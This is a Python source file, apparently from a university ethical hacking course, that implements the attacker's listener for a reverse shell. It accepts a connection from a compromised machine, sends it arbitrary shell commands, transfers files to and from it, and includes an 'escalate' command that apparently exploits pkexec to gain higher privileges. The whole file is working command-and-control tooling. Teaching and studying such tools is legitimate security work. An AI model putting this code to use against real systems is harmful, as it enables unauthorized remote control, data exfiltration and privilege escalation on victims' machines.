################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

import socket
import json
import os

target_ip = "192.168.56.1"
target_port = 5021

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        target.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        target.settimeout(1)
        chunk = target.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout as e:
                break
        target.settimeout(None)

def target_communication():
    dir = ''
    while True:
        command = input(f'* Shell~{str(ip)}: {dir}$ ')
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            dir = reliable_recv() + ' '
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == "escalate":
            user = command[9:]
            print(f"Escalating privileges of {user} with pkexec...")
            result = reliable_recv()
            print(result)
            while True:
                check = reliable_recv()
                print(check)
                if check == "DONE":
                    break
            result2 = reliable_recv()
            print(f"{result2}")
        elif command == "sudo su -l":
            print(command)
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((target_ip, target_port))
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
